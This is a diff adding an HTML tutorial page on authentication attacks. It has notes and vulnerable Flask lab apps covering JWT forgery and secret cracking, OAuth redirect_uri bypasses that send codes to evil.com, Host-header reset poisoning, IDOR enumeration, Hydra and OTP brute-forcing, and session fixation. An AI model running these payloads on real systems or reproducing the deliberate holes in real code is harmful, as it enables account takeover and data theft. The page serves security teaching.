@@ -1,0 +1,1485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Auth Attacks</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Authentication Attacks</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== JWT ATTACKS ==================== -->
+        <h2>JWT Attacks</h2>
+        <p>JSON Web Tokens: <code>header.payload.signature</code> (Base64url-encoded). Attacks target the signature verification logic.</p>
+
+        <h3>None Algorithm</h3>
+        <p>Change <code>"alg"</code> to <code>"none"</code> and remove the signature. Works if the server doesn't enforce algorithm validation.</p>
+<pre><code class="language-python">import base64, json
+
+# Original token: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIGNATURE
+
+# Forge token with alg: none
+header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
+payload = base64.urlsafe_b64encode(json.dumps({"user": "admin"}).encode()).rstrip(b'=')
+forged = header.decode() + '.' + payload.decode() + '.'
+print(forged)</code></pre>
+
+<pre><code class="language-bash"># Also try variations:
+# "alg": "None", "alg": "NONE", "alg": "nOnE"
+# Some libraries accept these case variants</code></pre>
+
+        <h3>Weak Secret (HS256 Cracking)</h3>
+<pre><code class="language-bash"># Crack HS256 secret with hashcat
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+# Or with john
+john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
+
+# jwt_tool brute force
+python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt</code></pre>
+
+<pre><code class="language-python"># Once secret is known, forge tokens
+import jwt
+
+token = jwt.encode({"user": "admin", "role": "superadmin"}, "cracked_secret", algorithm="HS256")
+print(token)</code></pre>
+
+        <h3>Key Confusion (RS256 → HS256)</h3>
+        <p>If the server uses RS256 (asymmetric) but accepts HS256 (symmetric), sign with the <strong>public key</strong> as the HMAC secret.</p>
+<pre><code class="language-python">import jwt
+
+# 1. Obtain the server's public key (/.well-known/jwks.json, /public.pem, etc.)
+with open('public.pem', 'r') as f:
+    public_key = f.read()
+
+# 2. Sign with public key using HS256
+token = jwt.encode(
+    {"user": "admin", "role": "admin"},
+    public_key,
+    algorithm="HS256"
+)
+print(token)</code></pre>
+
+<pre><code class="language-bash"># jwt_tool automation
+python3 jwt_tool.py TOKEN -X k -pk public.pem</code></pre>
+
+        <h3>JWK Header Injection</h3>
+        <p>Embed your own public key in the token's <code>jwk</code> header parameter. If the server uses the embedded key for verification, you control signing.</p>
+<pre><code class="language-python">from jwcrypto import jwk, jwt as jwcrypto_jwt
+import json
+
+# Generate a new RSA key pair
+key = jwk.JWK.generate(kty='RSA', size=2048)
+
+# Create token with embedded JWK
+header = {
+    "alg": "RS256",
+    "typ": "JWT",
+    "jwk": json.loads(key.export_public())
+}
+claims = {"user": "admin", "role": "admin"}
+
+token = jwcrypto_jwt.JWT(header=header, claims=claims)
+token.make_signed_token(key)
+print(token.serialize())</code></pre>
+
+        <h3>JKU Spoofing</h3>
+        <p>Set <code>"jku"</code> (JWK Set URL) in the header to point to your server hosting a crafted JWKS. The server fetches your keys for verification.</p>
+<pre><code class="language-bash"># 1. Generate key pair and JWKS
+python3 -c "
+from jwcrypto import jwk
+key = jwk.JWK.generate(kty='RSA', size=2048)
+print('{\"keys\":[' + key.export_public() + ']}')
+" > jwks.json
+
+# 2. Host it
+python3 -m http.server 8888
+
+# 3. Forge token with jku pointing to your server
+# Header: {"alg":"RS256","jku":"http://YOUR_IP:8888/jwks.json","kid":"your-key-id"}</code></pre>
+
+        <h3>JWT Tools Cheatsheet</h3>
+<pre><code class="language-bash"># jwt_tool — Swiss army knife for JWT
+git clone https://github.com/ticarpi/jwt_tool
+python3 jwt_tool.py TOKEN                  # Decode and analyze
+python3 jwt_tool.py TOKEN -T               # Tamper mode (interactive)
+python3 jwt_tool.py TOKEN -X a             # alg:none attack
+python3 jwt_tool.py TOKEN -X k -pk pub.pem # Key confusion attack
+python3 jwt_tool.py TOKEN -C -d wordlist   # Crack HS256 secret
+python3 jwt_tool.py TOKEN -I -pc user -pv admin  # Inject claim</code></pre>
+
+        <!-- ==================== SESSION MANAGEMENT ==================== -->
+        <h2>Session Management Flaws</h2>
+
+        <h3>Predictable Session Tokens</h3>
+<pre><code class="language-python"># Weak: sequential or timestamp-based tokens
+# session_id = "user_" + str(int(time.time()))
+# session_id = "sess_" + str(counter)
+
+# Test: collect multiple tokens, look for patterns
+import requests
+
+tokens = []
+for i in range(10):
+    r = requests.post('https://target.com/login', data={'user': f'test{i}', 'pass': 'test'})
+    tokens.append(r.cookies.get('session'))
+    print(f"Token {i}: {tokens[-1]}")
+
+# Analyze for sequential values, timestamps, weak randomness</code></pre>
+
+        <h3>Session Fixation</h3>
+        <p>Attacker sets the victim's session ID before authentication. If the server doesn't regenerate the session after login, the attacker shares the session.</p>
+<pre><code class="language-bash"># 1. Attacker gets a valid session ID
+curl -c cookies.txt https://target.com/login
+
+# 2. Attacker sends victim a URL with the fixed session
+https://target.com/login?PHPSESSID=attacker_known_session
+
+# 3. Victim logs in — session ID doesn't change
+# 4. Attacker uses the same session ID — now authenticated</code></pre>
+
+        <h3>Insecure Cookie Flags</h3>
+        <table>
+          <tr><th>Flag</th><th>When Missing</th><th>Impact</th></tr>
+          <tr><td><code>HttpOnly</code></td><td>Cookie accessible via <code>document.cookie</code></td><td>XSS → session theft</td></tr>
+          <tr><td><code>Secure</code></td><td>Cookie sent over HTTP</td><td>MITM → session theft</td></tr>
+          <tr><td><code>SameSite</code></td><td>Cookie sent cross-origin</td><td>CSRF attacks</td></tr>
+          <tr><td><code>Path</code></td><td>Cookie sent to all paths</td><td>Broader exposure</td></tr>
+        </table>
+
+<pre><code class="language-bash"># Check cookie flags in response
+curl -v https://target.com/login 2>&1 | grep -i set-cookie
+
+# Look for missing flags:
+# Set-Cookie: session=abc123         ← no flags at all
+# Set-Cookie: session=abc123; Path=/ ← missing HttpOnly, Secure, SameSite</code></pre>
+
+        <!-- ==================== OAUTH ==================== -->
+        <h2>OAuth / OIDC Attacks</h2>
+
+        <h3>redirect_uri Manipulation</h3>
+        <p>If the OAuth provider doesn't strictly validate <code>redirect_uri</code>, the authorization code or token can be sent to an attacker-controlled URL.</p>
+<pre><code class="language-bash"># Original flow
+https://auth.target.com/authorize?client_id=APP&redirect_uri=https://app.com/callback&response_type=code
+
+# Attack: modify redirect_uri
+https://auth.target.com/authorize?client_id=APP&redirect_uri=https://evil.com/steal&response_type=code
+
+# Bypass variations when partial matching is used
+redirect_uri=https://app.com.evil.com/callback
+redirect_uri=https://app.com@evil.com/callback
+redirect_uri=https://app.com%40evil.com/callback
+redirect_uri=https://evil.com/?.app.com
+redirect_uri=https://app.com/callback/../../../evil.com</code></pre>
+
+        <h3>Missing State Parameter</h3>
+        <p>Without <code>state</code>, the OAuth flow is vulnerable to CSRF — attacker can link their own OAuth account to a victim's account.</p>
+<pre><code class="language-bash"># Attack: initiate OAuth flow, get the callback URL with auth code
+# Send the callback URL to the victim
+# Victim's browser completes the flow — attacker's OAuth account linked to victim
+
+# Check: does the authorize request include state?
+# Does the callback validate state?</code></pre>
+
+        <h3>Token Leakage</h3>
+<pre><code class="language-bash"># Implicit flow leaks token in URL fragment
+https://app.com/callback#access_token=eyJ...&token_type=bearer
+
+# Token in URL → leaked via:
+# - Referer header to third-party resources on the page
+# - Browser history
+# - Server logs (if fragment reaches server)
+
+# Check response_type — prefer "code" over "token"</code></pre>
+
+        <!-- ==================== PASSWORD RESET ==================== -->
+        <h2>Password Reset Flaws</h2>
+<pre><code class="language-bash"># Predictable reset tokens
+# If token = MD5(email + timestamp), attacker can guess it
+
+# Host header injection — poison the reset link
+POST /forgot-password HTTP/1.1
+Host: evil.com
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@target.com
+# Reset email contains: https://evil.com/reset?token=abc123
+
+# Also try:
+# X-Forwarded-Host: evil.com
+# X-Original-URL: evil.com
+
+# Token reuse — does the token expire after use?
+# Token in URL — leaked via Referer header
+# No rate limiting — brute force short tokens</code></pre>
+
+        <!-- ==================== IDOR ==================== -->
+        <h2>IDOR (Insecure Direct Object Reference)</h2>
+        <p>Accessing resources by changing identifiers (user IDs, document IDs, etc.) without proper authorization checks.</p>
+<pre><code class="language-bash"># Sequential IDs
+GET /api/users/1001    → your profile
+GET /api/users/1000    → someone else's profile
+GET /api/users/1       → admin profile?
+
+# UUIDs — harder but not impossible
+# Check for UUID leakage in responses, URLs, JavaScript files
+
+# Common IDOR endpoints
+GET /api/orders/ORDER_ID
+GET /api/invoices/INVOICE_ID
+GET /api/documents/DOC_ID
+POST /api/users/USER_ID/update
+DELETE /api/messages/MSG_ID</code></pre>
+
+<pre><code class="language-python"># Automated IDOR scan
+import requests
+
+session = requests.Session()
+session.cookies.set('token', 'YOUR_AUTH_TOKEN')
+
+for uid in range(1, 100):
+    r = session.get(f'https://target.com/api/users/{uid}')
+    if r.status_code == 200:
+        data = r.json()
+        print(f"[+] User {uid}: {data.get('email', 'N/A')} - {data.get('role', 'N/A')}")</code></pre>
+
+        <!-- ==================== BRUTE FORCE ==================== -->
+        <h2>Brute Force / Credential Stuffing</h2>
+
+        <h3>Hydra</h3>
+<pre><code class="language-bash"># HTTP POST login form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \
+  "/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+# HTTP Basic Auth
+hydra -l admin -P wordlist.txt target.com http-get /admin
+
+# SSH
+hydra -l root -P wordlist.txt ssh://target.com
+
+# With username list
+hydra -L users.txt -P passwords.txt target.com http-post-form \
+  "/login:user=^USER^&pass=^PASS^:F=Login failed"</code></pre>
+
+        <h3>Burp Intruder</h3>
+<pre><code class="language-bash"># 1. Capture login request in Burp Proxy
+# 2. Send to Intruder (Ctrl+I)
+# 3. Mark password field as insertion point: §password§
+# 4. Load payload list (rockyou, common passwords)
+# 5. Start attack — look for different response length/status
+
+# Cluster Bomb: test all username × password combinations
+# Pitchfork: test username[i] with password[i] (credential stuffing)</code></pre>
+
+        <!-- ==================== 2FA BYPASS ==================== -->
+        <h2>2FA Bypass Techniques</h2>
+<pre><code class="language-bash"># Direct navigation — skip 2FA page
+# After entering credentials, go directly to /dashboard instead of /2fa
+
+# Response manipulation — change {"success": false} to {"success": true}
+
+# Brute force OTP (if no rate limiting)
+# 4-digit code = 10,000 attempts
+# 6-digit code = 1,000,000 attempts
+
+# Backup codes — are they guessable or reusable?
+
+# Status code manipulation
+# If 2FA failure returns 401, change to 200 in proxy
+
+# Previous session — is there an active session before 2FA?
+# Check if the pre-2FA cookie already grants partial access</code></pre>
+
+<pre><code class="language-python"># Brute force 4-digit OTP
+import requests
+
+session = requests.Session()
+# Login first to get session cookie
+session.post('https://target.com/login', data={'user': 'admin', 'pass': 'password'})
+
+for code in range(10000):
+    otp = str(code).zfill(4)
+    r = session.post('https://target.com/2fa', data={'code': otp})
+    if 'Invalid' not in r.text:
+        print(f'[+] Valid OTP: {otp}')
+        break
+    if code % 100 == 0:
+        print(f'Tried {code}...')</code></pre>
+
+        <!-- ==================== RACE CONDITIONS ==================== -->
+        <h2>Race Conditions in Auth</h2>
+        <p>Concurrent requests can bypass rate limiting, use a single-use token multiple times, or create duplicate accounts.</p>
+<pre><code class="language-python"># Race condition: use a single-use invite code multiple times
+import threading, requests
+
+url = 'https://target.com/register'
+data = {'email': 'attacker@evil.com', 'invite_code': 'SINGLE_USE_CODE'}
+
+def register():
+    r = requests.post(url, data=data)
+    print(f"Status: {r.status_code} - {r.text[:100]}")
+
+threads = [threading.Thread(target=register) for _ in range(20)]
+for t in threads: t.start()
+for t in threads: t.join()</code></pre>
+
+<pre><code class="language-bash"># Using turbo-intruder (Burp extension) for single-packet attack
+# Sends all requests in a single TCP packet to maximize race window
+
+# Using curl with parallel execution
+seq 1 50 | xargs -P 50 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
+  -X POST https://target.com/redeem -d "code=VOUCHER123"</code></pre>
+
+        <!-- ==================== DEFAULT CREDS ==================== -->
+        <h2>Default Credentials</h2>
+        <table>
+          <tr><th>Service</th><th>Username</th><th>Password</th></tr>
+          <tr><td>Tomcat Manager</td><td><code>tomcat</code></td><td><code>tomcat</code> / <code>s3cret</code></td></tr>
+          <tr><td>Jenkins</td><td><code>admin</code></td><td><code>admin</code></td></tr>
+          <tr><td>phpMyAdmin</td><td><code>root</code></td><td><em>(empty)</em></td></tr>
+          <tr><td>Grafana</td><td><code>admin</code></td><td><code>admin</code></td></tr>
+          <tr><td>WordPress</td><td><code>admin</code></td><td><code>admin</code> / <code>password</code></td></tr>
+          <tr><td>MongoDB</td><td colspan="2">No auth by default</td></tr>
+          <tr><td>Redis</td><td colspan="2">No auth by default</td></tr>
+          <tr><td>Elasticsearch</td><td colspan="2">No auth by default</td></tr>
+          <tr><td>Router/IoT</td><td><code>admin</code></td><td><code>admin</code> / <code>password</code></td></tr>
+        </table>
+
+<pre><code class="language-bash"># Automated default credential check
+# https://github.com/ihebski/DefaultCreds-cheat-sheet
+creds search tomcat
+creds search jenkins
+
+# Nmap script for HTTP default creds
+nmap --script http-default-accounts -p 8080 target.com</code></pre>
+
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: JWT None Algorithm Bypass</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Forge a JWT to gain admin access by exploiting the none algorithm vulnerability.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — JWT none algorithm lab
+from flask import Flask, request, jsonify
+import jwt, json, base64
+
+app = Flask(__name__)
+SECRET = 'super_secret_key_123'
+
+@app.route('/login', methods=['POST'])
+def login():
+    user = request.form.get('username', 'guest')
+    token = jwt.encode({"user": user, "role": "user"}, SECRET, algorithm="HS256")
+    return jsonify({"token": token})
+
+@app.route('/admin')
+def admin():
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    if not token:
+        return jsonify({"error": "No token"}), 401
+    try:
+        # Vulnerable: doesn't enforce algorithm
+        parts = token.split('.')
+        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
+        if header.get('alg', '').lower() == 'none':
+            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+        else:
+            payload = jwt.decode(token, SECRET, algorithms=["HS256"])
+        if payload.get('role') == 'admin':
+            return jsonify({"message": "Welcome admin!", "secret": "admin_panel_data_here"})
+        return jsonify({"message": f"Hello {payload.get('user')}, you are not admin"}), 403
+    except Exception as e:
+        return jsonify({"error": str(e)}), 401
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Login as guest: <code>curl -X POST http://localhost:5000/login -d "username=guest"</code></li>
+              <li>Decode the returned JWT — inspect the header and payload</li>
+              <li>Craft a new JWT with <code>{"alg":"none"}</code> and <code>{"user":"admin","role":"admin"}</code></li>
+              <li>Send the forged token: <code>curl -H "Authorization: Bearer FORGED_TOKEN" http://localhost:5000/admin</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: JWT Weak Secret Cracking</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Crack the HS256 secret, forge a token with admin privileges, and access the protected endpoint.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — JWT weak secret lab
+from flask import Flask, request, jsonify
+import jwt
+
+app = Flask(__name__)
+SECRET = 'password1'  # Weak secret — in rockyou.txt
+
+@app.route('/login', methods=['POST'])
+def login():
+    user = request.form.get('username', 'guest')
+    token = jwt.encode({"user": user, "role": "user"}, SECRET, algorithm="HS256")
+    return jsonify({"token": token})
+
+@app.route('/admin')
+def admin():
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    try:
+        payload = jwt.decode(token, SECRET, algorithms=["HS256"])
+        if payload.get('role') == 'admin':
+            return jsonify({"flag": "JWT_WEAK_SECRET_CRACKED"})
+        return jsonify({"error": "Not admin"}), 403
+    except jwt.InvalidTokenError as e:
+        return jsonify({"error": str(e)}), 401
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Login and get a valid JWT</li>
+              <li>Save the token to a file: <code>echo "TOKEN" > jwt.txt</code></li>
+              <li>Crack with hashcat: <code>hashcat -a 0 -m 16500 jwt.txt rockyou.txt</code></li>
+              <li>Or with john: <code>john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256</code></li>
+              <li>Once cracked, forge a token with <code>role: admin</code> and access <code>/admin</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: OAuth redirect_uri Manipulation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a misconfigured OAuth flow to steal the authorization code by manipulating the redirect URI.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — OAuth redirect_uri lab
+from flask import Flask, request, redirect, session, jsonify
+import secrets, urllib.parse
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(16)
+
+# Simulated OAuth provider
+AUTH_CODES = {}
+VALID_CLIENT = 'webapp'
+
+@app.route('/oauth/authorize')
+def authorize():
+    client_id = request.args.get('client_id', '')
+    redirect_uri = request.args.get('redirect_uri', '')
+    state = request.args.get('state', '')
+
+    # Vulnerable: only checks if redirect_uri STARTS with allowed domain
+    allowed_prefix = 'http://localhost:5000/'
+    if not redirect_uri.startswith(allowed_prefix):
+        return '&lt;p&gt;Invalid redirect_uri&lt;/p&gt;', 400
+
+    # Simulate user clicking "Authorize"
+    code = secrets.token_hex(16)
+    AUTH_CODES[code] = {'client_id': client_id, 'user': 'admin'}
+    return redirect(f'{redirect_uri}?code={code}&state={state}')
+
+@app.route('/callback')
+def callback():
+    code = request.args.get('code', '')
+    return f'&lt;h1&gt;Logged in!&lt;/h1&gt;&lt;p&gt;Auth code: {code}&lt;/p&gt;'
+
+@app.route('/oauth/token', methods=['POST'])
+def token():
+    code = request.form.get('code', '')
+    if code in AUTH_CODES:
+        user_data = AUTH_CODES.pop(code)
+        return jsonify({"access_token": "FLAG{oauth_redirect_uri_bypass}", "user": user_data['user']})
+    return jsonify({"error": "invalid_code"}), 400
+
+# Open redirect on the same domain (exploitable)
+@app.route('/redirect')
+def open_redir():
+    url = request.args.get('url', '/')
+    return redirect(url)
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Normal flow: <code>/oauth/authorize?client_id=webapp&redirect_uri=http://localhost:5000/callback&response_type=code</code></li>
+              <li>The filter checks that redirect_uri starts with <code>http://localhost:5000/</code></li>
+              <li>Find the open redirect at <code>/redirect?url=...</code></li>
+              <li>Chain: set redirect_uri to <code>http://localhost:5000/redirect?url=http://YOUR_SERVER/steal</code></li>
+              <li>This passes the prefix check but redirects the auth code to your server</li>
+              <li>Exchange the stolen code at <code>/oauth/token</code> to get the flag</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: JWT kid Header Injection</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit the JWT <code>kid</code> (Key ID) header to perform path traversal and sign with a known file.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — JWT kid injection
+from flask import Flask, request, jsonify
+import jwt, json, hmac, hashlib
+
+app = Flask(__name__)
+
+KEYS = {
+    'key1': 'real_secret_key_abc123',
+    'key2': 'another_secret_456',
+}
+
+@app.route('/login', methods=['POST'])
+def login():
+    user = request.form.get('username', 'guest')
+    token = jwt.encode(
+        {"user": user, "role": "user"},
+        KEYS['key1'], algorithm="HS256",
+        headers={"kid": "key1"}
+    )
+    return jsonify({"token": token})
+
+@app.route('/admin')
+def admin():
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    try:
+        header = jwt.get_unverified_header(token)
+        kid = header.get('kid', 'key1')
+        # Vulnerable: reads key from file path based on kid
+        try:
+            with open(f'/app/keys/{kid}', 'r') as f:
+                secret = f.read().strip()
+        except:
+            secret = KEYS.get(kid, '')
+        payload = jwt.decode(token, secret, algorithms=["HS256"])
+        if payload.get('role') == 'admin':
+            return jsonify({"flag": "FLAG{jwt_k1d_1nj3ct10n}"})
+        return jsonify({"error": "Not admin"}), 403
+    except Exception as e:
+        return jsonify({"error": str(e)}), 401
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Get a token from <code>/login</code> — inspect the <code>kid</code> in the header</li>
+              <li>The server reads a key file based on <code>kid</code> — path traversal possible</li>
+              <li>Set <code>kid</code> to <code>../../dev/null</code> — file is empty, so the secret is an empty string</li>
+              <li>Sign a forged token with an empty string as the secret and <code>role: admin</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: JWT jku Header Spoofing</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit the <code>jku</code> header to point the server to your own JWKS endpoint for token verification.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — JWT jku spoofing
+from flask import Flask, request, jsonify
+import jwt, requests as req, json
+from jwcrypto import jwk as jwk_lib
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    key = jwk_lib.JWK.generate(kty='RSA', size=2048)
+    token = jwt.encode(
+        {"user": "guest", "role": "user"},
+        key.export_to_pem(private_key=True, password=None),
+        algorithm="RS256",
+        headers={"jku": "http://localhost:5000/.well-known/jwks.json"}
+    )
+    return jsonify({"token": token})
+
+@app.route('/admin')
+def admin():
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    try:
+        header = jwt.get_unverified_header(token)
+        jku = header.get('jku', '')
+        # Vulnerable: fetches JWKS from attacker-controlled URL
+        resp = req.get(jku, timeout=5)
+        jwks = resp.json()
+        # Use first key from JWKS
+        pub_key = jwk_lib.JWK(**jwks['keys'][0])
+        payload = jwt.decode(token, pub_key.export_to_pem(), algorithms=["RS256"])
+        if payload.get('role') == 'admin':
+            return jsonify({"flag": "FLAG{jku_sp00f3d}"})
+        return jsonify({"error": "Not admin"}), 403
+    except Exception as e:
+        return jsonify({"error": str(e)}), 401
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Generate your own RSA key pair</li>
+              <li>Host a JWKS file containing your public key on your server</li>
+              <li>Forge a JWT with <code>jku</code> pointing to your JWKS URL and <code>role: admin</code></li>
+              <li>Sign with your private key — the server fetches your JWKS to verify</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: IDOR Chaining</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit an IDOR vulnerability to access other users' data and escalate to admin functionality.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — IDOR chaining
+from flask import Flask, request, jsonify
+import jwt
+
+app = Flask(__name__)
+SECRET = 'idor_lab_secret'
+
+USERS = {
+    1: {"name": "admin", "email": "admin@corp.com", "api_key": "FLAG{1d0r_ch41n_3sc4l4t10n}"},
+    2: {"name": "alice", "email": "alice@corp.com", "api_key": "alice_key_123"},
+    3: {"name": "bob", "email": "bob@corp.com", "api_key": "bob_key_456"},
+}
+
+@app.route('/login', methods=['POST'])
+def login():
+    name = request.form.get('username', 'bob')
+    for uid, u in USERS.items():
+        if u['name'] == name:
+            return jsonify({"token": jwt.encode({"uid": uid}, SECRET), "uid": uid})
+    return jsonify({"error": "Not found"}), 404
+
+@app.route('/api/user/&lt;int:uid&gt;')
+def get_user(uid):
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    try:
+        jwt.decode(token, SECRET, algorithms=["HS256"])
+        # No check: does token.uid match requested uid?
+        return jsonify(USERS.get(uid, {"error": "Not found"}))
+    except:
+        return jsonify({"error": "Invalid token"}), 401
+
+@app.route('/api/user/&lt;int:uid&gt;/orders')
+def get_orders(uid):
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    try:
+        jwt.decode(token, SECRET, algorithms=["HS256"])
+        orders = {1: [{"id": 99, "item": "Secret Document"}], 2: [{"id": 1, "item": "Book"}]}
+        return jsonify(orders.get(uid, []))
+    except:
+        return jsonify({"error": "Invalid token"}), 401
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Login as <code>bob</code> (uid=3) and get a token</li>
+              <li>Access your own profile: <code>/api/user/3</code></li>
+              <li>Try <code>/api/user/1</code> — the admin's profile including API key</li>
+              <li>Also check <code>/api/user/1/orders</code> for admin's orders</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Brute Force with Hydra</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use Hydra to brute force a login form with a wordlist.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Brute force target
+from flask import Flask, request
+
+app = Flask(__name__)
+CREDS = {'admin': 'dragon'}
+
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        u = request.form.get('username', '')
+        p = request.form.get('password', '')
+        if u in CREDS and CREDS[u] == p:
+            return '&lt;h1&gt;Welcome admin! FLAG{hydr4_brut3_f0rc3}&lt;/h1&gt;'
+        return '&lt;h1&gt;Invalid credentials&lt;/h1&gt;', 401
+    return '''&lt;form method="POST"&gt;
+    &lt;input name="username"&gt;&lt;input name="password" type="password"&gt;
+    &lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;'''
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-bash"># Hydra brute force
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  127.0.0.1 http-post-form \
+  "/:username=^USER^&password=^PASS^:Invalid credentials"
+
+# -l admin        → username
+# -P rockyou.txt  → password wordlist
+# http-post-form  → POST request
+# F=Invalid creds → failure string</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Start the Flask app</li>
+              <li>Run Hydra with the command above</li>
+              <li>Identify the correct password from the output</li>
+              <li>Login manually with discovered credentials</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: Session Fixation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit session fixation — set a known session ID before the victim logs in, then hijack their session.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Session fixation
+from flask import Flask, request, make_response
+
+app = Flask(__name__)
+sessions = {}
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        user = request.form.get('username', '')
+        pwd = request.form.get('password', '')
+        if user == 'admin' and pwd == 'admin123':
+            # Vulnerable: reuses the session ID from the cookie instead of generating a new one
+            sid = request.cookies.get('session_id', '')
+            if not sid:
+                import secrets
+                sid = secrets.token_hex(16)
+            sessions[sid] = {'user': 'admin', 'role': 'admin'}
+            resp = make_response(f'&lt;h1&gt;Welcome admin!&lt;/h1&gt;&lt;a href="/dashboard"&gt;Dashboard&lt;/a&gt;')
+            resp.set_cookie('session_id', sid)
+            return resp
+        return '&lt;h1&gt;Login failed&lt;/h1&gt;'
+    return '''&lt;form method="POST"&gt;&lt;input name="username"&gt;
+    &lt;input name="password" type="password"&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;'''
+
+@app.route('/dashboard')
+def dashboard():
+    sid = request.cookies.get('session_id', '')
+    session = sessions.get(sid, {})
+    if session.get('role') == 'admin':
+        return '&lt;h1&gt;Admin Dashboard — FLAG{s3ss10n_f1x4t10n}&lt;/h1&gt;'
+    return '&lt;h1&gt;Not authenticated&lt;/h1&gt;', 401
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
